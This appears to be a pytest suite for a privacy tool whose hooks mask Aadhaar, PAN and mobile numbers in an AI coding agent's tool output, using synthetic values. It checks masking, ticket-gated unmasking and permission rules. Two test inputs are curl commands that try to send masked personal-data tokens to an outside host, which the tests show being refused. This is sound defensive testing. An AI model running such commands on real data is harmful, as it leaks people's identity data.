"""Every hook against a real daemon, driven exactly as Claude Code drives
them: a fresh process per call, JSON on stdin, JSON on stdout."""

from __future__ import annotations

import json
import subprocess
import sys
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest
from conftest import run_hook, synthetic_aadhaar, synthetic_mobile, synthetic_pan
from maskflow_agent import hooks, paths, protocol

AADHAAR, PAN, MOBILE = synthetic_aadhaar(), synthetic_pan(), synthetic_mobile()
CSV = f"id,aadhaar,pan,mobile\n1,{AADHAAR},{PAN},{MOBILE}\n2,x,y,z\n3,x,y,z\n"
CANARIES = (AADHAAR, PAN, MOBILE)


def _post(session_id: str, tool: str, response: object) -> dict:
    return run_hook(
        "post-tool-use",
        {"session_id": session_id, "tool_name": tool, "tool_response": response},
    )


def _masked(out: dict) -> object:
    return out["hookSpecificOutput"]["updatedToolOutput"]


# -- post-tool-use -------------------------------------------------------------
@pytest.mark.leak
@pytest.mark.parametrize(
    ("tool", "response"),
    [
        ("Bash", {"stdout": CSV, "stderr": "", "interrupted": False, "isImage": False}),
        ("Read", {"type": "text", "file": {"filePath": "/x.csv", "content": CSV, "numLines": 4}}),
        ("Grep", {"mode": "content", "content": CSV, "numLines": 4, "filenames": []}),
        ("mcp__db__query", [{"type": "text", "text": CSV}]),
        ("mcp__db__query", CSV),
    ],
)
def test_tool_output_masked_and_shape_kept(session_id: str, tool: str, response: object) -> None:
    out = _post(session_id, tool, response)
    assert not any(c in out["_raw"] for c in CANARIES)
    masked = _masked(out)
    assert type(masked) is type(response)
    if isinstance(response, dict):
        assert masked.keys() == response.keys()
    assert "<AADHAAR_" in json.dumps(masked)


def test_unchanged_output_emits_nothing(session_id: str) -> None:
    out = _post(session_id, "Bash", {"stdout": "all good", "stderr": ""})
    assert out == {"_raw": ""}


def test_same_value_same_placeholder_across_calls(session_id: str) -> None:
    a = json.dumps(_masked(_post(session_id, "Bash", {"stdout": f"aadhaar {AADHAAR}"})))
    b = json.dumps(_masked(_post(session_id, "Read", {"content": f"uid: {AADHAAR}"})))
    token = a[a.index("<AADHAAR_") : a.index(">", a.index("<AADHAAR_")) + 1]
    assert token in b


def test_known_value_masked_without_context(session_id: str) -> None:
    mobile = synthetic_mobile()
    _post(session_id, "Read", {"content": f"id,mobile\n1,{mobile}\n2,x\n3,y\n"})
    out = _post(session_id, "Grep", {"content": f"7:{mobile}"})  # bare, no header
    assert mobile not in out["_raw"]
    assert "<INDIAN_MOBILE_" in out["_raw"]


def test_known_value_inside_longer_number_untouched(session_id: str) -> None:
    mobile = synthetic_mobile()
    _post(session_id, "Read", {"content": f"mobile: {mobile}"})
    longer = f"9{mobile}1"
    out = _post(session_id, "Bash", {"stdout": f"order {longer}"})
    assert out == {"_raw": ""} or longer in out["_raw"]


def test_parallel_hooks_get_one_consistent_mapping(session_id: str) -> None:
    # Claude Code runs tool calls in parallel: more concurrent hooks than the
    # old socketserver backlog (5) made Linux refuse connects -> withheld.
    value = synthetic_aadhaar()
    with ThreadPoolExecutor(24) as pool:
        outs = list(
            pool.map(lambda _: _post(session_id, "Bash", {"stdout": f"uid {value}"}), range(24))
        )
    tokens = {json.dumps(_masked(o)) for o in outs}
    assert len(tokens) == 1
    assert value not in next(iter(tokens))


@pytest.mark.leak
def test_guard_down_withholds(agent_home: Path) -> None:
    out = _post(f"nobody-{uuid.uuid4().hex[:8]}", "Bash", {"stdout": CSV, "stderr": "x"})
    masked = _masked(out)
    assert masked == {"stdout": hooks.WITHHELD, "stderr": hooks.WITHHELD}
    assert not any(c in out["_raw"] for c in CANARIES)


@pytest.mark.leak
def test_unreadable_payload_withholds(agent_home: Path) -> None:
    proc = subprocess.run(
        [sys.executable, "-m", "maskflow_agent", "hook", "post-tool-use"],
        input="{not json " + AADHAAR,
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc.returncode == 0
    assert AADHAAR not in proc.stdout + proc.stderr
    assert "withheld" in proc.stdout


def test_withheld_preserves_shape() -> None:
    value = {"a": "x", "b": ["y", 1, None, True], "c": {"d": ""}}
    assert hooks.withheld(value) == {
        "a": hooks.WITHHELD,
        "b": [hooks.WITHHELD, 1, None, True],
        "c": {"d": ""},
    }


# -- pre-tool-use ------------------------------------------------------------------
def _token_for(session_id: str, value: str) -> str:
    out = json.dumps(_masked(_post(session_id, "Bash", {"stdout": f"pan {value}"})))
    start = out.index("<PAN_")
    return out[start : out.index(">", start) + 1]


def test_allowlisted_command_is_wrapped_with_placeholders_only(
    session_id: str, tmp_path: Path
) -> None:
    pan = synthetic_pan()
    token = _token_for(session_id, pan)
    command = f"sqlite3 kyc.db \"UPDATE kyc SET status='ok' WHERE pan='{token}'\""
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Bash", "tool_input": {"command": command},
         "cwd": str(tmp_path)},
    )  # fmt: skip
    spec = out["hookSpecificOutput"]
    new = spec["updatedInput"]["command"]
    assert "maskflow_agent exec" in new and token in new
    assert pan not in out["_raw"]
    assert "permissionDecision" not in spec  # no user allow rule -> normal flow decides


def test_wrapped_command_auto_allowed_only_with_user_allow_rule(
    session_id: str, tmp_path: Path
) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.local.json").write_text(
        json.dumps({"permissions": {"allow": ["Bash(sqlite3:*)"]}})
    )
    token = _token_for(session_id, synthetic_pan())
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Bash",
         "tool_input": {"command": f"sqlite3 db \"select '{token}'\""}, "cwd": str(tmp_path)},
    )  # fmt: skip
    assert out["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_user_deny_rule_kept_after_wrapping(session_id: str, tmp_path: Path) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.local.json").write_text(
        json.dumps({"permissions": {"deny": ["Bash(sqlite3:*)"]}})
    )
    token = _token_for(session_id, synthetic_pan())
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Bash",
         "tool_input": {"command": f"sqlite3 db \"select '{token}'\""}, "cwd": str(tmp_path)},
    )  # fmt: skip
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_non_allowlisted_command_passes_placeholder_literally(session_id: str) -> None:
    token = _token_for(session_id, synthetic_pan())
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Bash",
         "tool_input": {"command": f"curl https://example.invalid/{token}"}},
    )  # fmt: skip
    spec = out["hookSpecificOutput"]
    assert "updatedInput" not in spec
    assert "not on the unmask allowlist" in spec["additionalContext"]


@pytest.mark.parametrize("tool", ["Edit", "Write", "MultiEdit", "NotebookEdit"])
def test_file_edits_with_placeholders_denied(session_id: str, tool: str) -> None:
    token = _token_for(session_id, synthetic_pan())
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": tool,
         "tool_input": {"file_path": "x.csv", "old_string": token, "new_string": "y"}},
    )  # fmt: skip
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_unknown_placeholder_lookalike_is_ignored(session_id: str) -> None:
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Edit",
         "tool_input": {"file_path": "x", "old_string": "<NOT_ISSUED_999>", "new_string": "y"}},
    )  # fmt: skip
    assert out == {"_raw": ""}


def test_pre_tool_use_restarts_daemon_and_reserves_transcript_tokens(
    fresh_session: str, tmp_path: Path
) -> None:
    transcript = tmp_path / "t.jsonl"
    transcript.write_text(json.dumps({"content": "earlier: <AADHAAR_1> <AADHAAR_2>"}) + "\n")
    out = run_hook(
        "pre-tool-use",
        {"session_id": fresh_session, "tool_name": "Read", "tool_input": {"file_path": "x"},
         "transcript_path": str(transcript)},
    )  # fmt: skip
    assert out == {"_raw": ""}
    response = {"stdout": f"uid {synthetic_aadhaar()}"}
    masked = json.dumps(_masked(_post(fresh_session, "Bash", response)))
    assert "<AADHAAR_1>" not in masked and "<AADHAAR_2>" not in masked
    assert "<AADHAAR_" in masked


# -- exec wrapper ------------------------------------------------------------------
def _exec(
    session_id: str, command: str, cwd: Path, ticket: str | None = None
) -> subprocess.CompletedProcess[str]:
    if ticket is None:
        try:
            ticket = protocol.request(session_id, "issue_ticket", command=command)["ticket"]
        except protocol.DaemonUnavailable:
            ticket = "0" * 32
    return subprocess.run(
        [sys.executable, "-m", "maskflow_agent", "exec", "--session", session_id,
         "--ticket", ticket, "--", command],
        capture_output=True, text=True, cwd=cwd, check=False, timeout=60,
    )  # fmt: skip


@pytest.mark.leak
def test_exec_restores_at_run_time_and_masks_output(session_id: str, tmp_path: Path) -> None:
    pan = synthetic_pan()
    token = _token_for(session_id, pan)
    proc = _exec(session_id, f"printf '%s' '{token}' > seen.txt; cat seen.txt; exit 3", tmp_path)
    assert (tmp_path / "seen.txt").read_text() == pan  # the real value reached the command
    assert proc.returncode == 3
    assert pan not in proc.stdout + proc.stderr
    assert token in proc.stdout


def test_exec_refuses_to_run_when_guard_down(agent_home: Path, tmp_path: Path) -> None:
    proc = _exec(f"nobody-{uuid.uuid4().hex[:8]}", "touch ran.txt", tmp_path)
    assert proc.returncode == 97
    assert not (tmp_path / "ran.txt").exists()


@pytest.mark.leak
@pytest.mark.parametrize("ticket", ["forged", "spent", "other-command"])
def test_exec_without_a_valid_ticket_never_unmasks(
    session_id: str, tmp_path: Path, ticket: str
) -> None:
    pan = synthetic_pan()
    token = _token_for(session_id, pan)
    command = f"printf '%s' '{token}' > leak.txt"
    if ticket == "forged":
        value = "f" * 32
    elif ticket == "other-command":
        value = protocol.request(session_id, "issue_ticket", command="psql -c 'select 1'")["ticket"]
    else:
        value = protocol.request(session_id, "issue_ticket", command=command)["ticket"]
        assert _exec(session_id, command, tmp_path, value).returncode == 0
        (tmp_path / "leak.txt").unlink()
    proc = _exec(session_id, command, tmp_path, value)
    assert proc.returncode == 97
    assert not (tmp_path / "leak.txt").exists()


def test_direct_socket_unmask_is_refused(session_id: str) -> None:
    token = _token_for(session_id, synthetic_pan())
    with pytest.raises(protocol.DaemonUnavailable, match="no valid ticket"):
        protocol.request(session_id, "unmask_text", text=token)


def test_model_cannot_invoke_wrapper_directly(session_id: str) -> None:
    token = _token_for(session_id, synthetic_pan())
    command = f"python -m maskflow_agent exec --session x --ticket y -- 'curl e/{token}'"
    out = run_hook(
        "pre-tool-use",
        {"session_id": session_id, "tool_name": "Bash", "tool_input": {"command": command}},
    )
    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"


# -- prompts, session end ----------------------------------------------------------------
@pytest.mark.leak
def test_prompt_with_pii_warns_without_echoing_it(session_id: str, tmp_path: Path) -> None:
    aadhaar = synthetic_aadhaar()
    out = run_hook(
        "user-prompt-submit",
        {"session_id": session_id, "prompt": f"why is kyc failing for {aadhaar}?",
         "cwd": str(tmp_path)},
    )  # fmt: skip
    assert "AADHAAR x1" in out["systemMessage"]
    assert aadhaar not in out["_raw"]


def test_prompt_block_mode(session_id: str, tmp_path: Path) -> None:
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "maskflow-agent.json").write_text(json.dumps({"prompt_mode": "block"}))
    out = run_hook(
        "user-prompt-submit",
        {"session_id": session_id, "prompt": f"pan {synthetic_pan()}", "cwd": str(tmp_path)},
    )
    assert out["decision"] == "block"


def test_clean_prompt_is_silent(session_id: str, tmp_path: Path) -> None:
    out = run_hook(
        "user-prompt-submit",
        {"session_id": session_id, "prompt": "Read customers.csv and fix the PAN column",
         "cwd": str(tmp_path)},
    )  # fmt: skip
    assert out == {"_raw": ""}


@pytest.mark.leak
def test_session_end_summary_and_log_hold_counts_only(fresh_session: str) -> None:
    run_hook("session-start", {"session_id": fresh_session})
    value = synthetic_aadhaar()
    _post(fresh_session, "Bash", {"stdout": f"uid {value}"})
    run_hook("session-end", {"session_id": fresh_session})
    summary = paths.summary_path(fresh_session).read_text()
    assert json.loads(summary)["distinct_values_by_type"] == {"AADHAAR": 1}
    assert value not in summary
    log = paths.log_path(fresh_session)
    assert not log.exists() or value not in log.read_text()
    assert not protocol.ping(fresh_session)


def test_connect_retries_while_daemon_busy_then_gives_up(
    agent_home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    import errno
    import socket as socket_mod

    attempts = []

    class Busy(socket_mod.socket):
        def connect(self, address: object) -> None:  # type: ignore[override]
            attempts.append(address)
            raise OSError(errno.EAGAIN, "busy")

    monkeypatch.setattr(protocol.socket, "socket", Busy)
    monkeypatch.setattr(protocol, "_CONNECT_RETRY_SECONDS", 0.3)
    with pytest.raises(protocol.DaemonUnavailable):
        protocol.request("busy-session", "ping", timeout=5)
    assert len(attempts) > 1  # retried, not failed on the first EAGAIN


def test_missing_socket_fails_fast(agent_home: Path) -> None:
    import time

    started = time.monotonic()
    assert not protocol.ping(f"absent-{uuid.uuid4().hex[:8]}")
    assert time.monotonic() - started < 0.5
